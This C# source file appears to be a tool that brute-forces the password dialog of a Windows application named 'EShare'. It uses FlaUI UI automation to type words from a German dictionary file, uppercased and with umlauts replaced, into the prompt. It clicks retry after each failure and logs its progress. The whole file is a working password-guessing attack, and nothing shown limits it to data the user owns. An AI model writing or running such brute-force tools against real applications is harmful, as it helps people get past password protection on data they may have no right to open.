using System.CodeDom;
using System.Diagnostics;
using FlaUI.Core;
using FlaUI.Core.AutomationElements;
using FlaUI.Core.Definitions;
using FlaUI.Core.WindowsAPI;
using FlaUI.UIA3;
using Microsoft.VisualBasic.Devices;
using Keyboard = FlaUI.Core.Input.Keyboard;

namespace GNR.BruteForcEShare;

public class EShareBruteForcer : IDisposable
{
    private AutomationBase _automation;
    

    public AutomationElement? RootDialogue => _automation.GetDesktop().FindFirstChild(factory => factory.ByControlType(ControlType.Pane).And(factory.ByName("EShare")));
    
    
    public AutomationElement? TextInput =>
        RootDialogue?.FindFirstDescendant(factory => factory.ByControlType(ControlType.Edit));

    public AutomationElement? RetryButton => RootDialogue?.FindAllDescendants().FirstOrDefault(element => element.Name.StartsWith("Incorrect input"));
    
    public AutomationElement? LoadingLabel => RootDialogue?.FindFirstDescendant(factory =>
        factory.ByControlType(ControlType.Text).And(factory.ByText("Loading...")));
    
    public EShareBruteForcer()
    {
        _automation = new UIA3Automation();
        //var process = Process.GetProcesses().First(process => process.ProcessName.ToLower() == "eshare");
    }

    
    public void StartBruteForce(int continueAt = 1)
    {

        Task.Run(() =>
        {
            var dict = File.ReadAllLines("German.dic");
            dict = dict.Select(s => s.TrimEnd()).Where(s => s.Length < 9).ToArray();
            int counter = continueAt - 1;
            bool waitingForLoading = false;
            Stopwatch sw = new Stopwatch();
            while (counter < dict.Length)
            {
                var word = dict[counter].ToUpper();
                bool failed = false;
                bool loading = false;
                if (RetryButton != null)
                {

                    RetryButton?.Click();
                    Keyboard.Type(VirtualKeyShort.ENTER);
                } else if (LoadingLabel != null)
                {
                    waitingForLoading = false;
                    loading = true;
                    sw.Stop();
                }
                else if (TextInput != null && !waitingForLoading)
                {

                    var password = word.Replace("Ä", "A").Replace("Ö", "O").Replace("Ü", "U");
                    TextInput?.Click();
                    Keyboard.Type(password);
                    Keyboard.Type(VirtualKeyShort.RETURN);
                    counter++;
                    waitingForLoading = true;
                    //Thread.Sleep(1000);
                } else
                {
                    failed = true;
                    if (sw.Elapsed > TimeSpan.FromSeconds(10))
                    {
                        Console.WriteLine($"UI not responding. Last tried (word {counter} of {dict.Length}): {dict[counter-1]}");
                        break;
                    }
                }

                if ((counter + 1) % 100 == 0)
                {
                    Console.WriteLine($"Current word (word {counter+1} of {dict.Length}): {word}");
                }
                
                if (!loading)
                    sw.Start();

                if (!failed)
                {
                    sw.Restart();
                }

                
            }
        }).ConfigureAwait(false).GetAwaiter().GetResult();
    }

    public void Dispose()
    {
        _automation.Dispose();
    }
}